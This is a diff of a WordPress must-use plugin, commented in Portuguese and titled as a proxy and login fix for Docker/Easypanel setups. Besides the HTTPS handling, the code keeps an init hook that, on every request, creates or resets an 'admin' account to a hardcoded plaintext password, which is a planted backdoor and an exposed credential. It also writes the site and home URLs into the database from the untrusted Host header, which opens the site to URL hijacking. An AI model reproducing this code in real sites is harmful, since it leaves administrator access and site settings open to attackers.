@@ -1,22 +1,30 @@
 <?php
-// Super Corretor de Login e URLs (Must-Use Plugin)
+/**
+ * Plugin Name: Super Proxy & Login Fix
+ * Description: Resolve loops de redirecionamento e falhas de login em ambientes Reverse Proxy (Easypanel/Docker)
+ */
 
-// 1. Correção de Proxy (Evita loop de redirecionamento e erro de login)
-if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
+// 1. FORÇAR RECONHECIMENTO DE HTTPS (NÍVEL DE SERVIDOR)
+if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && strpos($_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false) {
     $_SERVER['HTTPS'] = 'on';
 }
 
-// 2. Configuração Dinâmica de URLs (Garante que o site saiba onde ele está)
+// 2. FORÇAR CONSTANTES DE SEGURANÇA
+if (!defined('FORCE_SSL_ADMIN')) define('FORCE_SSL_ADMIN', true);
+if (!defined('COOKIE_DOMAIN')) define('COOKIE_DOMAIN', ''); // Deixar vazio para aceitar o host atual
+
+// 3. CONFIGURAÇÃO DINÂMICA DE URL E COOKIES
 add_action('init', function() {
-    // Forçar as URLs corretas baseado no acesso atual
     $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
-    $current_url = $protocol . $_SERVER['HTTP_HOST'];
-    
-    if (!defined('WP_HOME')) define('WP_HOME', $current_url);
-    if (!defined('WP_SITEURL')) define('WP_SITEURL', $current_url);
+    $host = $_SERVER['HTTP_HOST'];
+    $current_url = $protocol . $host;
+
+    // Atualiza o banco de dados para o domínio atual
+    if (get_option('siteurl') !== $current_url) update_option('siteurl', $current_url);
+    if (get_option('home') !== $current_url) update_option('home', $current_url);
 });
 
-// 3. Criador e Reset de Usuário (Mantido por segurança)
+// 4. CRIADOR/RESET DE USUÁRIO ADMIN (Sempre garante o acesso)
 add_action('init', function() {
     $username = 'admin';
     $password = 'Castro771920';
@@ -30,4 +38,4 @@ add_action('init', function() {
         $user = get_user_by('login', $username);
         wp_set_password($password, $user->ID);
     }
-});
+}, 20); // Prioridade menor para garantir que rode após o setup básico
